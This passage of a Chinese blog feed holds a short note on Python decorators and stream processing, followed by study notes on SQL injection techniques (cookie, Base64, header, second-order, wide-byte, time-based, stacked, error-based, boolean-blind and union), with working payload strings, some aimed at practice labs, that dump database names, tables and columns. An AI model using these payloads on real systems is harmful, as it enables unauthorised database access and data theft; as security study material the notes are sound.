函数每次都会打印不同的消息。</p><p>需要注意的是，在使用全局变量时要小心，因为全局变量可能会在代码中的任何地方进行修改，这可能会导致出现意外的行为。<br>因此，最好将全局变量用于只读目的，或者在使用时采用适当的同步机制来避免竞争条件。<br>当然，除了 <code>global</code> 关键字之外，还可以使用其他的方式来在装饰器中引用外部变量。以下是一些常用的方法：</p><ol><li>使用闭包：在装饰器函数内部定义一个内部函数，并在内部函数中引用外部变量<br>（由于内部函数可以访问外部函数的变量）</li><li>使用类：将装饰器实现为一个类，并在类中引用外部变量<br>（由于类实例可以存储变量状态）</li></ol><p>无论是使用 <code>global</code> 关键字、闭包还是类，都可以在装饰器中引用外部变量。<br>除了上面所提到的方法，还可以将变量作为参数传递给装饰器。<br>这种方式通常适用于装饰器函数需要访问某些变量，但不希望将这些变量声明为全局变量的情况。</p><p>通过将变量作为参数传递给装饰器，我们可以更灵活地控制装饰器的行为，但同时也会增加代码的复杂度。因此，在选择使用这种方式时，需要权衡利弊，并根据具体的情况选择最适合的实现方式。</p><p>除了在装饰器中使用 <code>global</code> 关键字、闭包、类或参数等方式引用外部变量之外，还可以使用 <code>functools</code> 模块中的 <code>wraps</code> 装饰器来保留被装饰函数的元信息。<br>具体来说，<code>wraps</code> 装饰器可以用来保留被装饰函数的名称、文档字符串、参数签名等元信息，从而使得被装饰函数更加易于调试和理解。</p><h3 id="流处理技术"><a href="#流处理技术" class="headerlink" title="流处理技术"></a>流处理技术</h3><h4 id="概念解析"><a href="#概念解析" class="headerlink" title="概念解析"></a>概念解析</h4><p>流处理技术是一种处理数据的方式，它是指持续接收和处理流式数据的方式。<br>与批处理不同，流处理将数据视为连续的数据流，而不是离散的数据集合。</p><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><p>流处理技术的主要用途是实时分析和处理数据。<br>通过流处理技术，可以快速处理大量的<code>实时数据</code>，并从中提取有价值的信息。<br>流处理技术通常使用流处理引擎来实现，流处理引擎通常提供一系列的API和工具。<br>用于处理数据流、实时处理和聚合数据、分析数据和发送数据到其他系统。<br>流处理引擎还可以与其他系统和工具集成，例如数据库、数据仓库、消息队列等。</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>在使用流处理技术时，需要考虑以下几个方面：<br>（1）数据来源和输入方式：从不同的数据源中读取实时数据流。<br>（2）流处理引擎的选择：根据具体的业务需求和系统架构选择适合的流处理引擎。<br>&emsp;&emsp;(Apache Flink、Apache Kafka Streams、Apache Spark Streaming等)<br>（3）数据处理逻辑：定义数据处理逻辑。<br>（4）数据输出方式：传输和存储处理后的数据。</p><h4 id="简单的示例"><a href="#简单的示例" class="headerlink" title="简单的示例"></a>简单的示例</h4><p>下面是个使用Flask和cv2框架编写的一个用于播放视频的Python流处理脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token keyword">import</span> cv2app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>camera <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token string">"1.mp4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_frames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        success<span class="token punctuation">,</span> frame <span class="token operator">=</span> camera<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> success<span class="token punctuation">:</span>            ret<span class="token punctuation">,</span> buffer <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imencode<span class="token punctuation">(</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> frame<span class="token punctuation">)</span>            frame <span class="token operator">=</span> buffer<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">yield</span> <span class="token punctuation">(</span>b<span class="token string">'--frame\r\nContent-Type: image/jpeg\r\n\r\n'</span> <span class="token operator">+</span> buffer<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\r\n'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">video_feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>generate_frames<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>mimetype<span class="token operator">=</span><span class="token string">'multipart/x-mixed-replace;boundary=frame'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2023/03/19/cQ87hagSwpFA3CE.jpg" alt="效果就这样"><br>但是这样子做出来的很大缺陷:<br>1.没办法调倍速<br>2.没声音<br>3.不能循环播放之类的</p><p>但是，要想解决上面这些问题只需要再添加两行代码！！！<br>一行代码启动docker版nginx-rtmp服务<br>另一行代码使用FFmpeg推流，指定服务器地址<br>（我没试过，出问题别找我）</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cookie/Base64/HTTP头部注入</title>
      <link href="/2023/03/15/cookie%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/15/cookie%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>常见于&emsp;.asp?id=xx&emsp;之类的带参数的URL</p><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>cookie是一些数据信息，类型为“小型文本文件”，存储于电脑上的文本文件中。<br>cookie是服务器创建后返回给游览器的。游览器只进行了保存。<br> 一般cookie是以键值对进行表示的(key-value)</p><pre><code>cookie常用属性的解释：       Name： cookie的名字       Value： cooke的值       Path： 定义了Web站点上可以访问该Cookie的目录       Expires： 表示cookie的过期时间，也就是有效值       Size： 表示cookie的大小</code></pre><p>cookie有2种存储方式，会话性（关浏览器就清除）和持久性（保留到有效期结束）</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>ASP脚本中的request对象，被用于从用户那里获取信息。<br>Request对象的使用方法：request.[集合名称]（参数名称）<br>但是它同时允许提交时省略集合名称<br>按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的<br>所以，当未指明使用request对象的具体方法进行获取且未过滤语句时存在注入。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>（1）寻找.asp?id=xx这样的页面<br>（2）将“id=xx”删掉，看页面是否正常。不正常则说明参数在数据传递中启直接作用<br>（3）清空网址，输入</p><pre><code>javascript:alert(document.cookie=“id=”+escape(“xx”));document.cookie:表示当前浏览器中的cookie变量alert():弹出一个对话框escape():对字符串进行编码</code></pre><p>&emsp;&emsp;按Enter键后弹出一个对话框，内容是“id=xx”<br>&emsp;&emsp;然后重新输入原来URL回车<br>&emsp;&emsp;如果显示正常，说明是用Request(“id”)方式获取数据<br>（4）判断是否存在漏洞:将SQL判断语句带入，并重复第三步</p><pre><code>javascript:alert(document.cookie=“id=”+escape(“xx and 1=1”));javascript:alert(document.cookie=“id=”+escape(“xx and 1=2”));两次回显不一样则说明存在注入漏洞，并可以进行cookie注入</code></pre><p>（5）代入SQL语句</p><pre><code>javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xx order by 2&quot;));javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;284 union select 1,…… from xx&quot;));</code></pre><h3 id="Base64注入"><a href="#Base64注入" class="headerlink" title="Base64注入"></a>Base64注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>程序对GET的传参进行接收，并且对其进行解码，然后再放入查询语句中。<br>这时候我们可以编码，然后程序执行的时候，会把我们所编码的注入语句解码，再拼接到了原本程序要执行的代码中</p><h4 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h4><p>Base64注入实质上并不是一个全新的注入手段，而是一种对数据处理的方法。<br>Base64注入可以发生在cookie注入中，只要有</p><pre><code>$id = base64_decode($_GET[&#39;id&#39;]);</code></pre><p>这个函数语句，就会发生Base64的解码，甚至可以加解密成其他的格式<br>此时就需要一个个试或者进行白盒测试了。</p><h3 id="最后总结一下HTTP头部注入"><a href="#最后总结一下HTTP头部注入" class="headerlink" title="最后总结一下HTTP头部注入"></a>最后总结一下HTTP头部注入</h3><p>原理:后台开发人员为了验证客户端HTTP Header（比如常用的Cookie验证等）或者通过HTTP Header头信息获取客户端的一些信息（例如：User-Agent、Accept字段等），会对客户端HTTP Header 进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTP Header的注入漏洞</p><p>使用HTTP头部注入漏洞的前提条件:<br>（1）能够对请求头消息进行修改<br>（2）修改的请求头信息能够带入数据库执行<br>（3）数据库没有对输入的请求头做过滤</p><p>常见方法:<br>Cookie注入<br>User-Agent注入<br>Referer注入<br>XFF注入（X-Forwarded-For）</p><p>如果要详细了解请自行查询。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL二次注入&amp;宽字节注入</title>
      <link href="/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/13/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="SQL二次注入"><a href="#SQL二次注入" class="headerlink" title="SQL二次注入"></a>SQL二次注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在二次注入中，一般不会是单纯的二次注入<br>通常会与报错注入或Bool盲注结合。<br>比如，在注册页面输入的用户名在登录后才有盲注的回显<br>这时候我们需要自己编写脚本模拟注册及登录。</p><p>无法通过扫描工具或者手工测试出来，二次注入一般在审计代码过程中发现<br>从前端或黑盒测试无法看到</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>攻击者构造恶意的数据并存储在数据库后<br>防御者对语句中的特殊字符进行了转义处理<br>但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中<br>当程序调用恶意数据并执行SQL查询时就发生了SQL二次注入。<br>总而言之:<br>用户输入恶意的数据库查询语句时会被转义，<br>但在数据库调用读取语句时又被还原导致语句执行。</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p><strong>第一步：构造恶意语句</strong><br>没有恶意代码怎么能行？先上传含有能被转义的字符的恶意查询语句<br><strong>第二步：插入恶意数据</strong><br>传入数据并任他对其中特殊字符进行转义处理，但在保存在数据库时<strong>保留了原来的味道</strong><br><strong>第三步：二次构造语句，引用恶意数据</strong><br>因为开发者默认存在数据库里的数据都是安全的<br>所以在进行查询时，直接从数据库中取出九转大肠<br>结果如下:<br><img src="https://s2.loli.net/2023/03/13/wrX4BSlGyjPmqgH.jpg" alt="只保留了一点原始的味道"></p><h4 id="注入方法"><a href="#注入方法" class="headerlink" title="注入方法"></a>注入方法</h4><h5 id="构造并存入一个恶意语句"><a href="#构造并存入一个恶意语句" class="headerlink" title="构造并存入一个恶意语句"></a>构造并存入一个恶意语句</h5><p>由于这种注入太难以被判断及发现，所以本文只作简单说明(其实是因为我太菜了)</p><pre><code>在注册等类似能上传并存储数据的页面存入admin&#39;#mysql_escape_string()等函数会在特殊字符前加 \ 造成过滤的效果</code></pre><p>此时传入时不会执行恶意代码，因为它过滤了。<br>但是存入的时候没有更改原来的数据。</p><h5 id="调用数据库中的恶意语句"><a href="#调用数据库中的恶意语句" class="headerlink" title="调用数据库中的恶意语句"></a>调用数据库中的恶意语句</h5><p>既然原来的数据没改，那就再调出来用(相当于执行了恶意代码)。</p><pre><code>下面是sqllab靶场的题，二次执行时整个语句变成了这样子update password=$new where username=admin&#39;#</code></pre><p>admin后引号对前面的单引号进行了闭合，#注释掉了后面的语句，就相当于对admin进行了改密</p><h3 id="SQL宽字节注入"><a href="#SQL宽字节注入" class="headerlink" title="SQL宽字节注入"></a>SQL宽字节注入</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>**单字节字符集:**所有的字符都使用一个字节来表示（ASCII 编码0-127）<br>**多字节字符集:**在多字节字符集中，用多个字节来表示（也有可能一部分用一个字节表示）<br>**宽字符:**用多个字节来代表的字符称之为宽字符<br>**字符、字符集:**字符是组成字符集的基本单位<br>**UTF8:**由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF。<br>**宽字节:**GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>1、宽字节注入是利用mysql的一个特性:<br>&emsp;&emsp;PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为\）<br>&emsp;&emsp;MYSQL默认字符集是GBK等宽字节字符集。<br>2、PHP发送请求到mysql，mysql在使用GBK编码的时候会认为两个字符是一个汉字<br>3、字符和转义的反斜杠组成了新的汉字，但是组成的新汉字又不是一个正常的汉字，就起到了注掉 \ 的作用</p><h4 id="转义函数"><a href="#转义函数" class="headerlink" title="转义函数"></a>转义函数</h4><pre><code>addslashes函数:对单引号(’)、双引号(&quot;)、反斜线(\)与x00 (NULL字符）magic_quotes_gpc函数:判断解析用户提交的数据，有post、get、cookie数据时增加转义字符“\”mysql_real_escape_string函数mysql_escape_string函数</code></pre><h4 id="注入方法-1"><a href="#注入方法-1" class="headerlink" title="注入方法"></a>注入方法</h4><p>方法一:<br>比如and’的编码是%df’，传参时单引号被加上\变成了 %df&#39;<br>其中\的十六进制是%5C ，那么现在 %df&#39; =%df%5c%27<br>如果程序的默认字符集是GBK等宽字节字符集<br>则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗</p><pre><code>也就是说:%df\&#39; = %df%5c%27=縗&#39;</code></pre><p>我们再回想到注入的三要素，有了单引号(闭合)后就好注入了</p><p>方法二:<br>使用汉字绕过。<br>PHP接收到一个汉字后通过UTF-8编码（三字节），并和\两两配对组成两个汉字，避免了后面引号的转义</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL时间注入&amp;堆叠注入</title>
      <link href="/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/12/SQL%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="SQL时间注入"><a href="#SQL时间注入" class="headerlink" title="SQL时间注入"></a>SQL时间注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>无论输入什么都会返回正常的处理信息或者页面无回显<br>能依靠自身感知到页面的延时情况</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>前端在将数据传给后台时，设置了一个if语句<br>当条件为真时执行sleep语句，条件为假时无执行语句</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>时间注入又称延时注入，与布尔盲注同属于盲注无回显的类型。<br>如果想要注入，必不可少的是得看得到效果。<br>那么有没有什么方法能直接或是间接地显示或猜解出数据呢？<br>当然有！前面就已近提到过函数这个东西了。<br>函数与and结合时，如果传入的参数正确就会触发函数，否则不执行。<br>此时将函数与查询语句结合后再与传入的参数结合就能达到最终效果了。</p><h4 id="相关函数讲解"><a href="#相关函数讲解" class="headerlink" title="相关函数讲解"></a>相关函数讲解</h4><pre><code>if(a,b,c)                如果a是TRUE(a!=0或a!=NULL)，则返回b，否则返回csleep(x)                 延时x秒if(a,b,c)                a为真，执行b；否则执行cbenchmark(a,b)           a为操作次数，b为执行的函数                         原理是通过多次操作，让极短暂的延时增加到能识别的程度                         后面几个都是这种思想笛卡尔积                  别问，老子离散数学还没学到这！get_lock(key, timeout)   key(最好是数字)指定名称获取锁，timeout指定锁定时间                         前提条件是数据库连接是长连接正则bug                  利用大量正则计算延长时间，实现延时除此之外还有case … when … then … else … end</code></pre><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入点及注入的类型"><a href="#判断是否存在注入点及注入的类型" class="headerlink" title="判断是否存在注入点及注入的类型"></a>判断是否存在注入点及注入的类型</h5><pre><code>?id=1?id=5?id=5&#39;?id=5&quot;?id=5 and 1=1?id=5 and 1=2</code></pre><p>如果页面显示结果一样，那就说明可能是延时注入</p><h5 id="获取库长度"><a href="#获取库长度" class="headerlink" title="获取库长度"></a>获取库长度</h5><pre><code>?id=1 and if(length(database())&lt;10,sleep(5),1)?id=1 and if(length(database())=4,sleep(5),1)</code></pre><p>如果第一个没有延时，但是第二个有5秒延时则表名数据库名长度为4</p><h5 id="获取库名、表名、字段名及字段内容"><a href="#获取库名、表名、字段名及字段内容" class="headerlink" title="获取库名、表名、字段名及字段内容"></a>获取库名、表名、字段名及字段内容</h5><pre><code>爆数据库名?id=1 and if(ascii(substr(database(),1,1))=106,sleep(5),1)测试表数量?id=1 and (select count(table_name) from information_schema.tables where table_schema = database())&lt;5测试第一张表长度?id=1 and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&lt;10测试表名?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;100测试表中字段数量?id=1 and (select count(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)=5测试字段内容?id=1 and (select count(name) from users)=4</code></pre><p>这时候你会发现这就是布尔盲注的做法<br>一个一个跑咯，懒得细细讲解了</p><h3 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h3><h4 id="表现-1"><a href="#表现-1" class="headerlink" title="表现"></a>表现</h4><p>跟联合查询注入差不多，两个方式相应的真假值都有不同的回显。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在SQL中，分号表示一条 sql 语句的结束。<br>在分号后继续构造下一条语句，就会把两条语句一起执行。<br><strong>联合注入</strong>也是将两条语句合并在一起，两者之间有什么区别么？<br>union执行的语句类型是有限的，而堆叠注入可以执行任意语句。</p><h4 id="开始注入-1"><a href="#开始注入-1" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="检查注入点及回显位"><a href="#检查注入点及回显位" class="headerlink" title="检查注入点及回显位"></a>检查注入点及回显位</h5><pre><code>?id=1&#39;?id=1&#39; and 1=1--+?id=1&#39; and 1=2--+</code></pre><h5 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h5><p>方法前面都有讲，回去抄payload就行了<br>加入分号，再接一个SQL语句看是否能显出结果。</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>今天不讲一句，讲一段话。</p><p><strong>人像摄影，更强调人物本身的特点，仿佛这个人就在你面前一样。<br>但是每个人不同的身高决定了站立时必定不能拍出完美的图片。<br>因此，拍人像时，最简单的一个办法就是用跟他们同样的视角拍摄，<br>这样才能看见他们更多的表情、神态和动作。<br>你才能看到他们的世界，画面才会更有吸引力。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL报错注入</title>
      <link href="/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在公司开发项目是通常程序开发期间需要告诉使用者某些报错信息，方便程序员进行调试修复，定位文件错误，而且开发中会经常使用异常处理函数，捕获错误信息，比如在PHP中使用mysql_error()函数。如果SQL注入存在时，会有报错信息返回就可以采用报错注入进行攻击啦！！！</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>报错注入嘛，首先肯定要让它报错呀。<br>那么什么时候才会报错呢？</p><pre><code>Xpath语法错误     extractvalue(1,(concat(0x7e,(payload),0x7e)))     updatexml(1,(concat(0x7e,(payload),0x7e)))     0x7e这个十六进制数代表符号~，~这个符号在xpath语法中是不存在的，因此总能报错     详细的使用方法请自行查找数据溢出错误     exp(x)     当参数x超过710时，exp()函数会报错主键重复错误     floor(x)：     count()和group by遇到rand()产生的重复值时报错函数特性报错     使用name_const来制造一个列     mysql列名重复会报错参数类型报错(不写了，自己找去)</code></pre><p>现在有了报错，怎么利用？<br>忘记了那个and和or语句了吗？<br>把SQL语句放到产生报错的语句中，<br>再将原本要传入的参数和上面已经结合起来的语句用and合为payload。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h5><pre><code>?id=1&#39; -- a</code></pre><p>老一套了，直接拿来用。</p><h5 id="判断是否是报错注入"><a href="#判断是否是报错注入" class="headerlink" title="判断是否是报错注入"></a>判断是否是报错注入</h5><pre><code>?id=1&#39; and updatexml(1,&#39;~&#39;,3) -- a</code></pre><p>如果报错了那说明是的，这里可以多换几个函数。<br>要让前面一半正常执行！</p><h5 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h5><pre><code>?id=-1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(schema_name)        from information_schema.schemata)    , 1 , 31)),3) -- a</code></pre><p>一样的，函数自己换<br>但是注意高版本数据库基本上都没有这个漏洞了<br>尽管这样，一旦有漏洞就能用这个库跑了</p><h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(table_name)        from information_schema.tables        where table_schema = &#39;库名&#39;)    , 1 , 31)),3) -- a</code></pre><h5 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(column_name)        from information_schema.columns        where table_schema = &#39;库名&#39; and table_name = &#39;表名&#39;)    , 1 , 31)),3) -- a</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL布尔盲注(延时注入后面再写)</title>
      <link href="/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
      <url>/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。<br>或者为真时返回正常页面，为假时跳转到其它页面等。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在后端的PHP代码中，对你传入的数据进行了处理并判断<br>判断是True或False会执行不同代码</p><h4 id="开始注入-二分法"><a href="#开始注入-二分法" class="headerlink" title="开始注入(二分法)"></a>开始注入(二分法)</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>使用一些判断真假的语句来进行判定<br>当它是数字型时:</p><pre><code>1&#39; and 1=0 --+1&#39; and 1=1 --+</code></pre><p>如果第一个与第二个回显不一样那么可能是布尔盲注<br>但是不排除有些丧心病狂的扑街预判了你的预判<br>这时候修改为不常见的数值（如1352=1352等）</p><p>当它是字符串型注入时:</p><pre><code>1&#39; and &#39;1&#39;=&#39;114514 --+1&#39; and &#39;1&#39;=&#39;666 --+</code></pre><h5 id="猜数据库名长度"><a href="#猜数据库名长度" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h5><p>这个应该很好理解吧，既然它不告诉你有啥，那你就自己猜咯。<br>刚刚好又有and可以判断语句，是不是天无绝人之路？</p><pre><code>1&#39; and (length(database()))&gt;x--+</code></pre><p>当报错的时候就说明数据库名字长度是x-1了嘛</p><h5 id="猜数据库名（ASCII码）"><a href="#猜数据库名（ASCII码）" class="headerlink" title="猜数据库名（ASCII码）"></a>猜数据库名（ASCII码）</h5><pre><code>1&#39; and ascii(substr(database(),1,1))&gt;100--+1&#39; and ascii(substr(database(),1,1))&lt;150--+</code></pre><p>这样子一直用二分法来缩小数据库名的ASCII码范围直到求出最终值。<br>是不是很麻烦？是就对了！<br>现在是告诉你注入原理，不看就滚犊子。</p><h5 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h5><pre><code>1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100--+1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;150--+</code></pre><p>方法其实是和前面的联合查询注入一样的，多了个二分法而已<br>其实拿SQLmap和BP跑也是差不多的原理，只是自动化注入罢了</p><h5 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h5><pre><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&gt;50--+1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&lt;80--+</code></pre><p>还是一样的</p><h5 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h5><pre><code>1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&lt;80--+1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&gt;30--+</code></pre><p>仍然是一样的</p><h4 id="开始注入-字符判断法"><a href="#开始注入-字符判断法" class="headerlink" title="开始注入(字符判断法)"></a>开始注入(字符判断法)</h4><p>数据库名字长度的判断跟上面的的一样<br>对每一位猜解都要写很多次判断语句<br>判断这些字符数字</p><pre><code>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</code></pre><h4 id="使用Burp-Suite注入"><a href="#使用Burp-Suite注入" class="headerlink" title="使用Burp_Suite注入"></a>使用Burp_Suite注入</h4><p>由于手工进行一一判断，工作量较大，可使用Burp_Suite中的字典进行。<br>1、抓包并将数据包传送到intruder<br>2、对对应位置进行上面提到的字符数字爆破:</p><pre><code>http://192.168.162.128/?id=1&#39; and if(SUBSTRING(database(),$1$,1)=$d$,1,0)–+&amp;Submit=Submit#</code></pre><p>payload set中分别设置并开始attack:<br>number类型，从1到数据库名字长度，步长为1<br>simple list类型，导入字符数字的字典</p><p><em><strong>后面的同理，自己举一反三吧</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL联合注入</title>
      <link href="/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="SQL联合注入"><a href="#SQL联合注入" class="headerlink" title="SQL联合注入"></a>SQL联合注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>有回显且可进行联合查询</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>SQL中union select查询的方式将结果合在一起，并删除重复的数据。这就是联合查询。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>1、判断是否存在注入点<br>（1）修改参数值，查看数据是否改变<br>（2）插入单、双引号的检测方法，未闭合的单引号会有报错</p><p>2、判断注入点是整形还是字符型<br>（1）数字型：通过</p><pre><code>and 1=1</code></pre><p>（2）字符串型：闭合单引号测试语句</p><pre><code>&#39;and&#39;1&#39;=&#39;1</code></pre><p>3、判断查询列数</p><pre><code>select username,password from where username=&#39;root&#39; and password=123 order by 